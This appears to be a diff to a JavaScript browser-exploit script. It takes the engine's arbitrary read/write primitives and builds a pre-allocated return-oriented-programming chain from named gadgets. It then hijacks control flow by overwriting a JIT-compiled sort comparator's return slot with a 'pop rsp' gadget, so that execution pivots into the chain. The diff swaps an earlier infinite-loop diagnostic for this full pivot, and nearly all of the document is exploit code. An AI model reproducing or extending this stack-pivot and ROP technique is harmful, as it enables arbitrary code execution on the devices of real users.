@@ -327,45 +327,78 @@ async function prepare(p) {
             return null;
         }
 
-        // Scratch qword the pivoted chain writes a magic into, so JS can confirm
-        // RIP control after a clean return.
-        const scratch = malloc(0x10);
-        const MAGIC = new int64(0x1337c0de, 0x0defaced);
-        p.write8(scratch, new int64(0, 0));
-
         const G = gadgets;
         function gaddr(n) { const g = G[n]; if (!g) throw new Error("missing gadget " + n); return g; }
 
-        let done = false, calls = 0, pivotCf = null, origRet = null, origCB = null;
+        // PRE-ALLOCATE everything BEFORE the sort. Allocating inside the
+        // comparator (mid-sort) triggers GC/reentrancy and faults -- that was
+        // the earlier 0xa0020328. Inside the comparator we only WRITE, never
+        // allocate. The chain skeleton is built now; the four cf-dependent
+        // values are patched in when we trigger.
+        const scratch = malloc(0x20);
+        const MAGIC = new int64(0x1337c0de, 0x0defaced);
+        p.write8(scratch, new int64(0, 0));
+        const chainBuf = malloc(0x400);
+        const chainEntry = chainBuf;
+
+        // slot indices into chainBuf that get patched at trigger time
+        const S_RETSLOT = 6, S_ORIGRET = 8, S_CBSLOT = 11, S_ORIGCB = 13,
+              S_FINAL_RETSLOT = 18;
+        let ci = 0;
+        const put = (v) => { p.write8(chainBuf.add32(ci * 8), v); ci++; };
+        // 1) MAGIC -> scratch
+        put(gaddr("pop rdi")); put(scratch);              // 0,1
+        put(gaddr("pop rax")); put(MAGIC);                // 2,3
+        put(gaddr("mov [rdi], rax"));                     // 4
+        // 2) restore CF+0x08 := origRet   (retSlot / origRet patched in later)
+        put(gaddr("pop rdi")); put(new int64(0, 0));      // 5,6  <- S_RETSLOT
+        put(gaddr("pop rax")); put(new int64(0, 0));      // 7,8  <- S_ORIGRET
+        put(gaddr("mov [rdi], rax"));                     // 9
+        // 3) restore CF+0x10 := origCB    (cbSlot / origCB patched in later)
+        put(gaddr("pop rdi")); put(new int64(0, 0));      // 10,11 <- S_CBSLOT
+        put(gaddr("pop rax")); put(new int64(0, 0));      // 12,13 <- S_ORIGCB
+        put(gaddr("mov [rdi], rax"));                     // 14
+        // 4) comparator return value = boxed int 0 ("equal")
+        put(gaddr("pop rax")); put(new int64(0x00000000, 0xffff0000)); // 15,16
+        // 5) clean return: rsp := retSlot ; ret pops origRet (now restored)
+        put(gaddr("pop rsp")); put(new int64(0, 0));      // 17,18 <- S_FINAL_RETSLOT
+
+        let done = false, calls = 0, origRet = null, origCB = null;
         const comparator = function (a, b) {
             calls++;
-            // Warm up first: let sort call us enough times to baseline-JIT this
-            // function (so its epilogue is a native `ret` off CF+0x08).
+            // Warm up first: let sort baseline-JIT this function (native ret off
+            // CF+0x08, as the infloop test confirmed).
             if (done || calls < 200) return (a >>> 0) - (b >>> 0);
             const cf = findFrame();
             if (!cf) return (a >>> 0) - (b >>> 0);
             done = true;
-            pivotCf = cf;
             const retSlot = cf.add32(0x08);
             const cbSlot = cf.add32(0x10);
             origRet = p.read8(retSlot);
             origCB = p.read8(cbSlot);
 
-            // DIAGNOSTIC: before risking a full chain, test whether
-            // overwriting CF+0x08 actually redirects control. Point it at an
-            // infinite-loop gadget (jmp $, no memory access). Outcomes:
-            //   PAGE HANGS (no crash/reboot) -> CF+0x08 IS the live return
-            //     control point; the earlier crash was in the ROP chain, not
-            //     the pivot. (You must hard-reboot after a hang.)
-            //   PAGE CRASHES -> overwriting CF+0x08 corrupts control (wrong
-            //     slot / rsp semantics).
-            //   SORT CONTINUES (SELF-PIVOT-RESULT appears) -> we located a
-            //     STALE frame; CF+0x08 was not the live return.
-            const infloop = gaddr("infloop");
-            selfLog("SELF-PIVOT-FIRED", "cf+0x08:=infloop(0x" + infloop.toString()
-                + ") -- HANG=slot-is-control, CRASH=wrong-slot, "
-                + "CONTINUE=stale-frame");
-            p.write8(retSlot, infloop);
+            // Patch the cf-dependent values into the pre-built chain (writes only)
+            p.write8(chainBuf.add32(S_RETSLOT * 8), retSlot);
+            p.write8(chainBuf.add32(S_ORIGRET * 8), origRet);
+            p.write8(chainBuf.add32(S_CBSLOT * 8), cbSlot);
+            p.write8(chainBuf.add32(S_ORIGCB * 8), origCB);
+            p.write8(chainBuf.add32(S_FINAL_RETSLOT * 8), retSlot);
+
+            const cbLooksHeap = (origCB.hi >>> 0) >= 0x8 && (origCB.hi >>> 0) <= 0x9ff;
+            selfLog("SELF-PIVOT-ARM", "cf=0x" + cf.toString()
+                + "-retSlot=0x" + retSlot.toString()
+                + "-chainEntry=0x" + chainEntry.toString()
+                + "-origRet=0x" + origRet.toString()
+                + "-origCB=0x" + origCB.toString()
+                + "-cbLooksHeap=" + cbLooksHeap);
+
+            // Overwrite: CF+0x10 = chainEntry, CF+0x08 = pop rsp. On the JS
+            // return, native ret pops CF+0x08 -> pop rsp -> rsp = [CF+0x10] =
+            // chainEntry -> chain runs, writes MAGIC, restores both slots, and
+            // returns cleanly into sort.
+            p.write8(cbSlot, chainEntry);
+            p.write8(retSlot, gaddr("pop rsp"));
+            selfLog("SELF-PIVOT-FIRED", "armed; returning -> pivot now");
             return 0;
         };
         comparatorAddr = p.leakval(comparator);
